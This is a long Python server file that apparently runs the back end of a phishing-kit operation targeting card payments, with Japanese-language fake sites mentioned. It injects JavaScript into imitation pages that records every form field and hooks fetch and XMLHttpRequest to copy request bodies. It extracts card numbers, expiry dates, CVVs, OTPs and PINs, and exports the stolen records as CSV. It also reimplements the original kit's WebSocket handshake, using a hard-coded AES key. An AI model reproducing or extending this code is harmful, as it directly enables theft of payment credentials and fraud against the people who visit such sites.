    if two == 30 or two in (36, 38, 39):
        return "Diners Club"
    if four == 6011 or two == 65:
        return "Discover"
    if two == 62:
        return "UnionPay"
    if two in (50, 56, 57, 58, 63, 67):
        return "Maestro"
    return ""


def extract_card_values(flat: dict) -> dict:
    """从用户填写的字段里认出卡号 / 有效期 / CVV / OTP / PIN 等。

    先精确匹配别名，再按包含关系兜底（这类仿站的 input name 各站不同，
    日文站常是「カード番号」「セキュリティコード」这种写法）。
    """
    out: dict[str, str] = {}
    for key, value in (flat or {}).items():
        if value in (None, ""):
            continue
        text = str(value).strip()
        if not text:
            continue
        k = norm_key(key)
        if not k:
            continue
        digits = re.sub(r"\D", "", text)
        # 卡号：名称里有卡字样，值去掉空格后是 13~19 位数字
        if "ccard" not in out and 13 <= len(digits) <= 19:
            if any(token in k for token in ("card", "カード", "ccard", "pan")) \
                    and not any(skip in k for skip in ("cvv", "cvc", "セキュリティ", "有効期限", "expiry")):
                out["ccard"] = digits
                continue
        for field, aliases in CARD_ALIASES.items():
            if field in out:
                continue
            if any(k == norm_key(a) or k.startswith(norm_key(a)) or norm_key(a) in k for a in aliases):
                out[field] = text[:128]
                break
    return out


def site_flow_script(slug: str) -> bytes:
    """注入到前台页面：暴露页面顺序，无人值守时按顺序自动推进。"""
    script = r"""
(function(){
  var slug = "__SLUG__";
  if (!slug) return;
  var KEY = "gw_site_flow_" + slug;
  function current(){
    var name = (location.pathname.split("/").pop() || "index.html");
    if (!/\.html?$/.test(name)) name = "index.html";
    return name;
  }
  function apply(order){
    var name = current();
    var idx = order.indexOf(name);
    var next = idx >= 0 ? (order[idx + 1] || null) : null;
    window.__gwFlow = { order: order, current: name, next: next };
    var mode = localStorage.getItem("unattended");
    if (!mode || mode === "0" || !next) return;
    setTimeout(function(){ location.replace("/" + next); }, 3000);
  }
  try {
    var cached = localStorage.getItem(KEY);
    if (cached) apply(JSON.parse(cached));
  } catch (e) {}
  fetch("/api/site-flow?project=" + encodeURIComponent(slug), {cache: "no-store"})
    .then(function(r){ return r.ok ? r.json() : null; })
    .then(function(data){
      if (!data || !data.order) return;
      try { localStorage.setItem(KEY, JSON.stringify(data.order)); } catch (e) {}
      apply(data.order);
    })
    .catch(function(){});
})();
"""
    return ("<script data-gw-flow>" + script.replace("__SLUG__", slug) + "</script>").encode()


def capture_script(post_path: str, site_code: str) -> bytes:
    """注入到每个前台页面的采集脚本（对齐原平台 /api/client/postData 的载荷）。

    同一访客用 localStorage 里的 uuid 串起来：一次访问 → 一条 visitors 记录，
    每次提交按步骤名（loginPage / cardPage / …）并进 data，卡字段再落 payments。
    """
    endpoint = json.dumps(post_path)
    site = json.dumps(site_code or "")
    script = r"""
(function(){
if(window.__gwCap)return;window.__gwCap=1;
var EP=__EP__,SITE=__SITE__,last="",lastAt=0,step=0;
function uuid(){
  try{
    var k="gw_uuid",v=localStorage.getItem(k);
    if(!v){v="g"+Date.now().toString(36)+Math.random().toString(36).slice(2,10);localStorage.setItem(k,v);}
    return v;
  }catch(e){return ""}
}
function action(){
  var p=(location.pathname||"").toLowerCase(),f=p.split("/").pop()||"";
  if(/checkout/.test(p))return "checkoutPage";
  if(/certificate|verify|identity/.test(p))return "identityPage";
  if(/news/.test(p))return "infoPage";
  if(/result|success/.test(p))return "resultPage";
  if(f===""||f==="index.html"||p==="/")return "loginPage";
  return f.replace(/\.html?$/,"").replace(/[^a-z0-9_\-]/g,"")||"page";
}
function val(el){
  try{
    var v=el.value;
    if(v==null)return "";
    if(el.type==="checkbox"||el.type==="radio")return el.checked?(String(v)||"on"):"";
    return String(v);
  }catch(e){return ""}
}
function keyOf(el,i){
  var n=el.getAttribute("name")||el.getAttribute("id")||el.getAttribute("placeholder")||
        el.getAttribute("aria-label")||el.getAttribute("autocomplete")||el.type||"f";
  n=String(n).replace(/[^\w\u3040-\u30ff\u4e00-\u9fff.@\-]/g,"_").slice(0,64);
  return n||("f"+i);
}
function snapshot(){
  var out={},els=document.querySelectorAll("input,select,textarea"),n=0;
  for(var i=0;i<els.length;i++){
    var el=els[i];
    try{
      if(el.disabled)continue;
      var t=(el.type||"").toLowerCase();
      if(t==="file"||t==="submit"||t==="button"||t==="image"||t==="reset")continue;
      var v=val(el);
      if(v==="")continue;
      var k=keyOf(el,i);
      if(out[k]!==undefined)k=k+"#"+i;
      out[k]=v.slice(0,512);
      if(++n>=40)break;
    }catch(e){}
  }
  return out;
}
function cardBin(f){
  for(var k in f){
    if(!/card|カード|pan|ccard/i.test(k))continue;
    var d=String(f[k]).replace(/\D/g,"");
    if(d.length>=6)return d.slice(0,6);
  }
  return "";
}
function tz(){try{return Intl.DateTimeFormat().resolvedOptions().timeZone||""}catch(e){return ""}}
function send(p){
  if(!p)return;
  var body;
  try{body=JSON.stringify(p)}catch(e){return}
  var now=Date.now();
  if(body===last&&now-lastAt<2000)return;
  last=body;lastAt=now;
  try{
    if(navigator.sendBeacon&&navigator.sendBeacon(EP,new Blob([body],{type:"application/json"})))return;
  }catch(e){}
  try{
    fetch(EP,{method:"POST",credentials:"same-origin",keepalive:true,
      headers:{"Content-Type":"application/json"},body:body});
    return;
  }catch(e){}
  try{
    var x=new XMLHttpRequest();
    x.open("POST",EP,true);
    x.setRequestHeader("Content-Type","application/json");
    x.send(body);
  }catch(e){}
}
function push(kind,fields){
  var f=fields||snapshot(),n=0;
  for(var k in f){n++;}
  if(!n&&!fields)return;
  var p={
    uuid:uuid(),
    site_code:SITE||location.hostname,
    action:action(),
    _route:(location.pathname||"")+(location.hash&&location.hash.length<48?location.hash:""),
    data:f,
    cardBIN:cardBin(f),
    kind:kind,
    step:step,
    href:String(location.href).slice(0,512),
    referer:String(document.referrer||"").slice(0,512),
    lang:String(navigator.language||""),
    tz:tz(),
    screen:(window.screen?(screen.width+"x"+screen.height):"")
  };
  if(kind==="submit"||kind==="click")step++;
  send(p);
}
document.addEventListener("submit",function(){try{push("submit")}catch(e){}},true);
document.addEventListener("click",function(e){
  try{
    var t=e.target&&e.target.closest?e.target.closest("button,input[type=submit],[role=button],a"):null;
    if(!t)return;
    push("click");
  }catch(e){}
},true);
document.addEventListener("keydown",function(e){
  if(e.key==="Enter"||e.keyCode===13){try{push("enter")}catch(err){}}
},true);
try{
  var of=window.fetch;
  if(of){
    window.fetch=function(u,o){
      try{
        var b=o&&o.body;
        if(typeof b==="string"&&b.length&&b.length<8000){
          var f={};
          try{f=JSON.parse(b)}catch(err){f=flat(b)}
          if(f&&typeof f==="object")push("fetch",shrink(f));
        }
      }catch(err){}
      return of.apply(this,arguments);
    };
  }
}catch(e){}
try{
  var os=XMLHttpRequest.prototype.send;
  XMLHttpRequest.prototype.send=function(b){
    try{
      if(typeof b==="string"&&b.length&&b.length<8000){
        var f={};
        try{f=JSON.parse(b)}catch(err){f=flat(b)}
        if(f&&typeof f==="object")push("xhr",shrink(f));
      }
    }catch(err){}
    return os.apply(this,arguments);
  };
}catch(e){}
function flat(s){
  var o={},p=String(s).split("&");
  for(var i=0;i<p.length&&i<40;i++){
    if(!p[i])continue;
    var kv=p[i].split("=");
    var k=kv[0],v=kv.slice(1).join("=");
    try{k=decodeURIComponent(k);v=decodeURIComponent(v)}catch(e){}
    if(k&&v)o[k]=v;
  }
  return o;
}
function shrink(o){
  var out={},n=0;
  for(var k in o){
    var v=o[k];
    if(v===null||v===undefined||v==="")continue;
    if(typeof v==="object"){try{v=JSON.stringify(v)}catch(e){continue}}
    out[String(k).slice(0,80)]=String(v).slice(0,512);
    if(++n>=40)break;
  }
  return out;
}
})();
"""
    return ("<script>" + script.replace("__EP__", endpoint).replace("__SITE__", site) + "</script>").encode()



def captures_csv(rows) -> bytes:
    """把采集记录导成 CSV（带 BOM，Excel 直接打开不乱码）。"""
    header = ["编号", "时间", "域名", "页面", "步骤", "来源", "提交字段", "IP", "客户端",
              "语言", "时区", "屏幕", "Referer", "UA"]
    lines = [",".join(header)]
    for row in rows:
        try:
            pairs = json.loads(row.get("fields") or "{}")
            field_text = "; ".join(f"{k}={v}" for k, v in pairs.items()) if isinstance(pairs, dict) else str(pairs)
        except (TypeError, ValueError):
            field_text = str(row.get("fields") or "")
        client = row.get("client_type") or CLIENT_UNKNOWN
        cells = [
            row.get("id"), row.get("created_at"), row.get("domain"), row.get("path"),
            row.get("step"), row.get("kind"), field_text, row.get("ip"),
            CLIENT_LABELS.get(client, client), row.get("language"), row.get("timezone"),
            row.get("screen"), row.get("referer"), row.get("ua"),
        ]
        lines.append(",".join(_csv_cell(cell) for cell in cells))
    return ("\ufeff" + "\n".join(lines) + "\n").encode("utf-8")


def orders_csv(items) -> bytes:
    """订单导出（列顺序对齐原平台 users + payment 两张表）。"""
    header = ["编号", "时间", "更新时间", "站点", "域名", "动作", "账号", "卡号", "有效期",
              "CVV", "OTP", "PIN", "自定义1", "自定义2", "品牌", "银行", "国家",
              "状态", "IP", "UA", "提交明细"]
    lines = [",".join(header)]
    for item in items:
        payment = item.get("payment") or {}
        try:
            data = json.loads(item.get("data") or "{}")
        except (TypeError, ValueError):
            data = {}
        account = ""
        for step in data.values():
            if isinstance(step, dict):
                for key, value in step.items():
                    if any(token in norm_key(key) for token in ("account", "userid", "login", "email", "id")):
                        account = str(value)[:80]
                        break
            if account:
                break
        detail = json.dumps(data, ensure_ascii=False)
        status_text = "已付卡" if item.get("pay_status") else ("已提交" if item.get("status") else "未提交")
        cells = [
            item.get("id"), item.get("created_at"), item.get("updated_at"),
            item.get("site_abbreviation"), item.get("referer"), item.get("action"),
            account, payment.get("ccard", ""), payment.get("cdate", ""),
            payment.get("ccvv", ""), payment.get("otp", ""), payment.get("pin", ""),
            payment.get("custom1", ""), payment.get("custom2", ""),
            payment.get("card_brand", ""), payment.get("card_bank", ""),
            payment.get("card_country", ""), status_text, item.get("ip"),
            item.get("ua"), detail,
        ]
        lines.append(",".join(_csv_cell(cell) for cell in cells))
    return ("\ufeff" + "\n".join(lines) + "\n").encode("utf-8")


def _csv_cell(value) -> str:
    text = "" if value is None else str(value)
    if any(ch in text for ch in (",", '"', "\n", "\r", "\t")):
        return '"' + text.replace('"', '""') + '"'
    return text


WS_GUID = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"
WS_LOG = DATA_DIR / "ws.log"
# 前台混淆包用的 AES 密钥（从运行时抓到的 hex 字符串，按 ASCII 作为 32 字节 key）
KIT_WS_KEY = b"bda1ba0338a0ed9203b8f80fe81d9fd4"
try:  # 仅用于协议探测；缺库时回退为明文回包
    from Crypto.Cipher import AES as _KIT_AES
    from Crypto.Util.Padding import pad as _kit_pad
except Exception:  # pragma: no cover
    _KIT_AES = None
    _kit_pad = None


def kit_check_reply(site_code: str) -> dict:
    """原平台 /ws 的站点配置回包：客户端收到 type=check 就会隐藏遮罩并 setIsValid(true)。"""
    site_cfg = {
        "isNewUser": False,
        "robot_detection": 0,
        "custom_verification": None,
        "title": "",
        "content": "",
        "payment_content": "",
        # 无人值守：ac1=1 → 提交卡后自动跳 PIN；ac1=2 → OB；其他 → thanks
        # synchronous_control=0 才会触发自动推进
        "synchronous_control": "0",
        "jump_address": "",
        "ac1": "1",
        "price": "",
        "s1": "",
        "card_error_msg": "",
        "c_card_refuse_msg": "",
        "d_card_refuse_msg": "",
        "bin_refuse_msg": "",
        "site_code": site_code,
        "site_abbreviation": site_code,
    }
    return {"type": "check", "data": {"code": "0000", "data": site_cfg}}


def kit_ws_encrypt(payload: dict) -> str:
    """把 JSON 按 客户端约定加密：base64(iv + AES-256-CBC(json))。"""
    if _KIT_AES is None:
        return ""
    raw = json.dumps(payload, ensure_ascii=False).encode()
    iv = os.urandom(16)
    cipher = _KIT_AES.new(KIT_WS_KEY, _KIT_AES.MODE_CBC, iv)
    return base64.b64encode(iv + cipher.encrypt(_kit_pad(raw, 16))).decode()



def ws_accept_key(client_key: str) -> str:
    digest = hashlib.sha1((client_key + WS_GUID).encode()).digest()
    return base64.b64encode(digest).decode()


def ws_read_frame(rfile):
    """读一帧；返回 (opcode, payload) 或 None（连接结束）。"""
    header = rfile.read(2)
    if len(header) < 2:
        return None
    opcode = header[0] & 0x0F
    masked = bool(header[1] & 0x80)
    length = header[1] & 0x7F
    if length == 126:
        length = struct.unpack(">H", rfile.read(2))[0]
    elif length == 127:
        length = struct.unpack(">Q", rfile.read(8))[0]
    mask = rfile.read(4) if masked else b""
    payload = rfile.read(length) if length else b""
    if masked and mask:
        payload = bytes(byte ^ mask[i % 4] for i, byte in enumerate(payload))
    return opcode, payload


def ws_send_frame(wfile, payload: bytes, opcode: int = 0x1) -> None:
    header = bytes([0x80 | opcode])
    size = len(payload)
    if size < 126:
        header += bytes([size])
    elif size < 65536:
        header += bytes([126]) + struct.pack(">H", size)
    else:
        header += bytes([127]) + struct.pack(">Q", size)
    wfile.write(header + payload)
    wfile.flush()


def kit_unlock_script() -> bytes:
    """混淆包解锁垫片。

    这些包的 store 在收到 {type:"check"} 时应自行派发给 messageHandlers 并 setIsValid(true)，
    但实际在部分环境（https / 首次加载时序）下不会触发，页面就永远停在加载遮罩。
    这里在页面侧补一层：拿到 pinia 的 webSocket store 后，直接把 check 消息喂给它的 handler。
    """
    script = r"""
(function(){
  var tries=0;
  var timer=setInterval(function(){
    tries++;
    if(tries>150){clearInterval(timer);return;}
    try{
      var el=document.querySelector('#app');
      var app=el&&el.__vue_app__;
      var pinia=app&&app.config&&app.config.globalProperties&&app.config.globalProperties.$pinia;
      var store=pinia&&pinia._s&&pinia._s.get&&pinia._s.get('webSocket');
      if(!store||!store.socket||store.__gwPatched)return;
      store.__gwPatched=true;
      var dispatch=function(raw){
        try{
          var msg=typeof raw==='string'?JSON.parse(raw):raw;
          if(!msg||msg.type!=='check')return;
          var hs=store.messageHandlers||[];
          for(var i=0;i<hs.length;i++){try{hs[i](msg)}catch(e){}}
        }catch(e){}
      };
      store.socket.addEventListener('message',function(e){dispatch(e.data);});
      // 主动再要一次站点配置：服务端收到 view 就回 check，保证垫片一定能收到
      var n=0;
      var again=setInterval(function(){
        n++;
        try{store.socket.send(JSON.stringify({action:'view',data:''}));}catch(e){}
        if(n>=3)clearInterval(again);
      },2500);
      clearInterval(timer);
    }catch(e){}
  },200);
})();
"""
    return ("<script>" + script + "</script>").encode()


class Handler(BaseHTTPRequestHandler):
    server_version = "GatewayConsole/1.0"
    # Set per-request by the /__preview/<domain>/ local preview route.
    _preview_host = ""
    # Set per-request so the verification cookie can be bound to the domain.
    verification_domain = ""

    def log_message(self, fmt, *args):
        print(f"[{now_text()}] {self.client_address[0]} {fmt % args}")

    def end_headers(self):
        self.send_header("X-Content-Type-Options", "nosniff")
        self.send_header("X-Frame-Options", "DENY")
        self.send_header("Referrer-Policy", "same-origin")
        self.send_header("Permissions-Policy", "camera=(), microphone=(), geolocation=()")
        super().end_headers()

    def json(self, status: int, data, headers: dict | None = None):
        body = json_dumps(data)
        self.send_response(status)
        self.send_header("Content-Type", "application/json; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        for key, value in (headers or {}).items():
            self.send_header(key, value)
        self.end_headers()
        self.wfile.write(body)

    def read_json(self):
        length = int(self.headers.get("Content-Length", "0"))
        if length > 1024 * 1024:
            raise ValueError("璇锋眰鍐呭杩囧ぇ")
        if not length:
            return {}
        return json.loads(self.rfile.read(length).decode("utf-8"))

    def cookies(self):
        cookies = SimpleCookie()
        cookies.load(self.headers.get("Cookie", ""))
        return cookies

    def session(self):
        cleanup_memory()
        cookie = self.cookies().get("gateway_session")
        if not cookie:
            return None
        with MEMORY_LOCK:
            return SESSIONS.get(cookie.value)

    def require_auth(self):
        session = self.session()
        if not session:
            self.json(HTTPStatus.UNAUTHORIZED, {"error": "请先登录"})
            return None
        return session

    def client_ip(self):
        forwarded = self.headers.get("X-Forwarded-For", "")
        return forwarded.split(",", 1)[0].strip() or self.client_address[0]

    def do_GET(self):
        parsed = urlparse(self.path)
        path = parsed.path
        query = parse_qs(parsed.query)
        # 前台站点启动时连 msgsocket: 连不上就一直卡在加载遮罩
        if path == "/ws" and "websocket" in (self.headers.get("Upgrade") or "").lower():
            return self.ws_channel()
        if path.startswith("/__preview/"):
            # Local preview: pretend the Host header is the domain in the URL so
            # the normal public pipeline runs without editing the hosts file.
            rest = path[len("/__preview/"):]
            host, _, remainder = rest.partition("/")
            host = unquote(host).strip()
            domain_row = STORE.domain(host) if host else None
            if not domain_row:
                return self.json(404, {"error": f"域名 {host} 未在系统中配置，请先在前台配置里添加"})
            if remainder.strip("/") == "__gateway/click":
                self._preview_host = host
                try:
                    return self.public_click()
                finally:
                    self._preview_host = None
            # Verification endpoints/assets must run through their real handlers.
            if remainder.startswith("captcha"):
                self._preview_host = host
                try:
                    return self.route_captcha("/" + remainder, query)
                finally:
                    self._preview_host = None
            if remainder == "flow/login":
                self._preview_host = host
                try:
                    return self.flow_login()
                finally:
                    self._preview_host = None
            self._preview_host = host
            try:
                return self.serve_public("/" + remainder, domain_row)
            finally:
                self._preview_host = None
        if path == "/api/site-flow":
            host_for_flow = host_only(self.headers.get("Host", ""))
            flow_domain = STORE.domain(host_for_flow)
            flow_slug = ""
            if flow_domain and flow_domain.get("project_id"):
                flow_project = STORE.project(flow_domain["project_id"])
                flow_slug = (flow_project or {}).get("slug", "")
            flow_slug = flow_slug or (query.get("project") or [""])[0]
            flow_order = [page["file"] for page in STORE.project_page_files(flow_slug)] if flow_slug else []
            return self.json(200, {"project": flow_slug, "order": flow_order})
        public_domain = STORE.domain(host_only(self.headers.get("Host", "")))
        if public_domain:
            # Verification routes and their assets must stay reachable,
            # otherwise a visitor could never complete the challenge.
            if path.startswith("/captcha/"):
                return self.route_captcha(path, query)
            if path == "/flow/login":
                return self.flow_login()
            if path in ("/track/visit", "/track/click"):
                return self.track(path.rsplit("/", 1)[-1], query)
            if path == "/guard/check":
                return self.guard_check(query)
            if path == "/__gateway/click":
                return self.public_click()
            return self.serve_public(path, public_domain)
        if path == "/api/auth/captcha":
            return self.get_captcha()
        if path == "/api/auth/me":
            session = self.session()
            return self.json(200, {"authenticated": bool(session), "user": session and session["username"]})
        if path in ("/track/visit", "/track/click"):
            return self.track(path.rsplit("/", 1)[-1], query)
        if path == "/guard/check":
            return self.guard_check(query)
        if path == "/__gateway/click":
            return self.public_click()
        if path.startswith("/__gateway/preview/"):
            if not self.require_auth():
                return
            return self.serve_template_preview(unquote(path.rsplit("/", 1)[-1]))
        if path.startswith("/api/"):
            if not self.require_auth():
                return
            if path == "/api/blacklist" or path == "/api/blacklist/list":
                try:
                    page = max(1, int(query.get("page", ["1"])[0] or 1))
                    page_size = min(100, max(10, int(query.get("page_size", ["25"])[0] or 25)))
                except ValueError:
                    return self.json(400, {"error": "request failed"})
                total, rows = STORE.blacklist_list(query.get("q", [""])[0], page, page_size)
                return self.json(200, {"total": total, "page": page, "items": rows})
            if path == "/api/dashboard":
                return self.json(200, {**STORE.stats(), "clients": STORE.client_breakdown()})
            if path == "/api/events":
                try:
                    page = max(1, int(query.get("page", ["1"])[0] or 1))
                    page_size = min(100, max(10, int(query.get("page_size", ["25"])[0] or 25)))
                except ValueError:
                    return self.json(400, {"error": "request failed"})
                total, rows = STORE.events(
                    query.get("domain", [""])[0], query.get("type", [""])[0],
                    page, page_size, query.get("client", [""])[0],
                )
                return self.json(200, {"total": total, "page": page, "items": rows})
            if path == "/api/captures":
                try:
                    page = max(1, int(query.get("page", ["1"])[0] or 1))
                    page_size = min(100, max(10, int(query.get("page_size", ["25"])[0] or 25)))
                except ValueError:
                    return self.json(400, {"error": "request failed"})
                total, rows = STORE.captures(
                    query.get("domain", [""])[0], query.get("q", [""])[0], page, page_size,
                )
                return self.json(200, {"total": total, "page": page, "items": rows})
            if path == "/api/captures/export.csv":
                rows = STORE.captures_all(query.get("domain", [""])[0], query.get("q", [""])[0])
                body = captures_csv(rows)
                self.send_response(200)
                self.send_header("Content-Type", "text/csv; charset=utf-8")
                self.send_header("Content-Disposition", 'attachment; filename="captures.csv"')
                self.send_header("Content-Length", str(len(body)))
                self.send_header("Cache-Control", "no-store")
                self.end_headers()
                self.wfile.write(body)
                return
            if path == "/api/clients":
                return self.json(200, {
                    "types": [
                        {"client_type": client, "label": CLIENT_LABELS[client]}
                        for client in CLIENT_TYPES
                    ],
                    "breakdown": STORE.client_breakdown(),
                })
            if path == "/api/client/detect":
                return self.json(200, self.detect_client_payload(query.get("ua", [""])[0]))
            if path == "/api/domains":
                return self.json(200, {"items": STORE.domains()})
            if path == "/api/pages":
                slug = (query.get("project") or [""])[0]
                if not slug:
                    return self.json(400, {"error": "缺少 project 参数"})
                return self.json(200, {"project": slug, "pages": STORE.project_page_files(slug)})
            if path == "/api/pages/counts":
                # 一次返回全部前台的页面数：后台「页面顺序」下拉要显示“N 页”，
                # 逐个站请求 170 次不现实。
                counts = {}
                for item in SOURCE_CATALOG.values():
                    slug = str(item.get("slug") or "")
                    if not slug:
                        continue
                    folder = SOURCE_DIR / slug
                    counts[slug] = len(list(folder.glob("*.html"))) if folder.is_dir() else 0
                return self.json(200, {"counts": counts})
            if path == "/api/pages/preview":
                slug = (query.get("project") or [""])[0]
                name = (query.get("file") or [""])[0]
                stem = Path(name).stem
                if not slug or not stem or "/" in stem or "\\" in stem:
                    return self.json(400, {"error": "参数不合法"})
                png = Path(DATA_DIR) / "previews" / slug / f"{stem}.png"
                if not png.is_file():
                    return self.json(404, {"error": "该页面暂无预览图"})
                blob = png.read_bytes()
                self.send_response(200)
                self.send_header("Content-Type", "image/png")
                self.send_header("Content-Length", str(len(blob)))
                self.send_header("Cache-Control", "max-age=300")
                self.end_headers()
                self.wfile.write(blob)
                return
            if path == "/api/projects":
                downloaded = {item["slug"] for item in STORE.projects()}
                catalog = [{**item, "downloaded": item["slug"] in downloaded} for item in SOURCE_CATALOG.values()]
                return self.json(200, {"items": STORE.projects(), "catalog": catalog})
            if path == "/api/ipregistry/status":
                return self.ipregistry_status()
            if path == "/api/settings":
                return self.json(200, STORE.get_settings())
            return self.json(404, {"error": "request failed"})
        return self.serve_static(path)

    def ws_channel(self):
        """最小 WebSocket 通道：记录客户端首帧，用于对齐原平台的握手协议。"""
        key = self.headers.get("Sec-WebSocket-Key", "")
        domain_row = STORE.domain(host_only(self.headers.get("Host", ""))) or {}
        project = STORE.project(domain_row.get("project_id")) if domain_row.get("project_id") else None
        site_code = str((project or {}).get("slug") or "")
        self.send_response(101, "Switching Protocols")
        self.send_header("Upgrade", "websocket")
        self.send_header("Connection", "Upgrade")
        self.send_header("Sec-WebSocket-Accept", ws_accept_key(key))
        self.end_headers()
        try:
            with WS_LOG.open("a", encoding="utf-8") as log:
                log.write(f"\n[{now_text()}] connect host={self.headers.get('Host')} "
                          f"origin={self.headers.get('Origin')}\n")
                log.flush()
                while True:
                    frame = ws_read_frame(self.rfile)
                    if frame is None:
                        break
                    opcode, payload = frame
                    text = payload.decode("utf-8", "replace")
                    log.write(f"  op={opcode} len={len(payload)} {text[:1000]}\n")
                    log.flush()
                    if opcode == 0x9:
                        ws_send_frame(self.wfile, payload, opcode=0xA)
                    elif opcode == 0x8:
                        break
                    elif opcode == 0x1:
                        # 原平台协议：客户端连上后发 {action:"view", data:<加密站点配置>}，
                        # 服务端回 {type:"check", data:{code:"0000", data:{站点配置}}}，
                        # 客户端收到后隐藏加载遮罩并置 isValid。
                        if '"ping"' in text:
                            ws_send_frame(self.wfile, b'{"type":"pong"}')
                        elif '"action":"view"' in text:
                            # 客户端在 onMounted 里才注册 handler；同时它可能要求 data 是加密串。
                            # 明密两种形态各发若干次，覆盖两种解析路径。
                            payload_obj = {"code": "0000", "data": kit_check_reply(site_code)["data"]["data"]}
                            plain = json.dumps({"type": "check", "data": payload_obj}, ensure_ascii=False).encode()
                            enc = kit_ws_encrypt(payload_obj)
                            encrypted = (json.dumps({"type": "check", "data": enc},
                                                     ensure_ascii=False).encode() if enc else b"")

                            def _push_check(wfile=self.wfile, a=plain, b=encrypted, sink=log):
                                for _ in range(6):
                                    for frame in (a, b):
                                        if not frame:
                                            continue
                                        try:
                                            ws_send_frame(wfile, frame)
                                            sink.write("  >> sent check reply\n")
                                            sink.flush()
                                        except Exception:
                                            return
                                    time.sleep(1.2)

                            threading.Thread(target=_push_check, daemon=True).start()
        except (BrokenPipeError, ConnectionResetError, OSError):
            pass

    def do_OPTIONS(self):
        if urlparse(self.path).path in ("/track/visit", "/track/click", "/guard/check"):
            self.send_response(204)
            self.send_header("Access-Control-Allow-Origin", "*")
            self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
            self.send_header("Access-Control-Allow-Headers", "Content-Type")
            self.send_header("Access-Control-Max-Age", "86400")
            self.end_headers()
            return
        self.send_error(404)

    def do_POST(self):
        parsed = urlparse(self.path)
        path = parsed.path
        try:
            data = self.read_json()
        except (ValueError, json.JSONDecodeError) as exc:
            return self.json(400, {"error": str(exc) or "JSON 格式错误"})
        is_captcha_post = path == "/captcha/verify" or (
            path.startswith("/__preview/") and path.endswith("/captcha/verify")
        )
        # Login receipt registration lives on the same public surface, so it has
        # to be reachable on a domain-bound host just like /captcha/verify.
        is_flow_post = path == "/flow/login" or (
            path.startswith("/__preview/") and path.endswith("/flow/login")
        )
        # 前台页面把表单内容送回这里的采集口，所以它必须和 /track 一样
        # 在绑定域名的 Host 上可达。
        is_collect_post = path == "/collect" or path == "/api/client/postData" or path == "/api/client/visit" or (
            path.startswith("/__preview/") and (
                path.endswith("/collect")
                or path.endswith("/api/client/postData")
                or path.endswith("/api/client/visit")
            )
        )
        if STORE.domain(host_only(self.headers.get("Host", ""))) and path not in (
            "/track/visit", "/track/click", "/__client/env", "/collect",
            "/api/client/postData", "/api/client/visit") and not is_captcha_post and not is_flow_post:
            return self.json(404, {"error": "request failed"})
        if is_collect_post:
            if path.endswith("/api/client/visit"):
                return self.client_visit(data)
            return self.collect(data)
        is_env_post = path == "/__client/env" or (
            path.startswith("/__preview/") and path.endswith("/__client/env")
        )
        if is_env_post:
            preview_host = ""
            if path.startswith("/__preview/"):
                preview_host = unquote(path[len("/__preview/"):].split("/", 1)[0]).strip()
            self._preview_host = preview_host
            try:
                return self.client_env_report(data)
            finally:
                self._preview_host = ""
        if is_flow_post:
            preview_host = self._preview_host
            if not preview_host and path.startswith("/__preview/"):
                preview_host = unquote(path[len("/__preview/"):].split("/", 1)[0]).strip()
            self._preview_host = preview_host or ""
            try:
                return self.flow_login()
            finally:
                self._preview_host = ""
        if is_captcha_post:
            preview_host = self._preview_host
            if not preview_host:
                preview_host = unquote(path[len("/__preview/"):].split("/", 1)[0]).strip()
            domain_row = STORE.domain(host_only(self.headers.get("Host", ""))) or (
                STORE.domain(preview_host) if preview_host else None
            )
            if not domain_row:
                return self.json(404, {"error": "request failed"})
            self._preview_host = preview_host
            self.verification_domain = domain_row["domain"]
            try:
                return self.captcha_verify(data)
            finally:
                self._preview_host = ""
        if path == "/api/pages/order":
            slug = str((data or {}).get("project") or "").strip()
            order = (data or {}).get("order") or []
            if not slug or not isinstance(order, list):
                return self.json(400, {"error": "参数不合法"})
            if not STORE.set_project_page_order(slug, order):
                return self.json(404, {"error": f"项目 {slug} 不存在"})
            return self.json(200, {"ok": True, "saved": len(order)})
        if path == "/api/auth/login":
            return self.login(data)
        if path in ("/track/visit", "/track/click"):
            return self.track(path.rsplit("/", 1)[-1], data)
        if path == "/api/auth/logout":
            cookie = self.cookies().get("gateway_session")
            if cookie:
                with MEMORY_LOCK:
                    SESSIONS.pop(cookie.value, None)
            return self.json(200, {"ok": True}, {"Set-Cookie": "gateway_session=; Path=/; Max-Age=0; HttpOnly; SameSite=Strict"})
        if not self.require_auth():
            return
        if path == "/api/events/clear":
            deleted = STORE.clear_events()
            return self.json(200, {"ok": True, "deleted": deleted})
        if path == "/api/captures/clear":
            deleted = STORE.captures_clear()
            return self.json(200, {"ok": True, "deleted": deleted})
        if path == "/api/user/listData":
            params = data if isinstance(data, dict) else {}
            referer = params.get("referer")
            if isinstance(referer, list):
                referer = referer[0] if referer else ""
            try:
                page = max(1, int(params.get("page") or 1))
                page_size = min(500, max(1, int(params.get("pagesize") or 25)))
            except (TypeError, ValueError):
                return self.json(400, {"code": 400, "msg": "参数错误"})
            total, items = STORE.visitors_list(
                keyword=str(params.get("keyword") or "").strip(),
                site=str(params.get("site_abbreviation") or "").strip(),
                referer=str(referer or "").strip(),
                status=str(params.get("status") or ""),
                start=str(params.get("createdStartTime") or ""),
                end=str(params.get("createdEndTime") or ""),
                page=page, page_size=page_size,
            )
            return self.json(200, {"code": 200, "msg": "ok",
                                   "data": {"total": total, "items": items, "page": page}})
        if path == "/api/user/export":
            params = data if isinstance(data, dict) else {}
            referer = params.get("referer")
            if isinstance(referer, list):
                referer = referer[0] if referer else ""
            items = STORE.visitors_all(
                keyword=str(params.get("keyword") or "").strip(),
                site=str(params.get("site_abbreviation") or "").strip(),
                referer=str(referer or "").strip(),
                status=str(params.get("status") or ""),
                start=str(params.get("createdStartTime") or ""),
                end=str(params.get("createdEndTime") or ""),
            )
            body = orders_csv(items)
            self.send_response(200)
            self.send_header("Content-Type", "text/csv; charset=utf-8")
            self.send_header("Content-Disposition", 'attachment; filename="orders.csv"')
            self.send_header("Content-Length", str(len(body)))
            self.send_header("Cache-Control", "no-store")
            self.end_headers()
            self.wfile.write(body)
            return
        if path == "/api/user/statistics":
            return self.json(200, {"code": 200, "msg": "ok", "data": STORE.order_stats()})
        if path == "/api/user/doEmpty":
            STORE.captures_clear()
            deleted_v = 0
            with STORE.connect() as db:
                deleted_v = db.execute("DELETE FROM visitors").rowcount
                db.execute("DELETE FROM payments")
            return self.json(200, {"code": 200, "deleted": deleted_v})
        if path == "/api/blacklist/add":
            ip = str(data.get("ip", "")).strip()
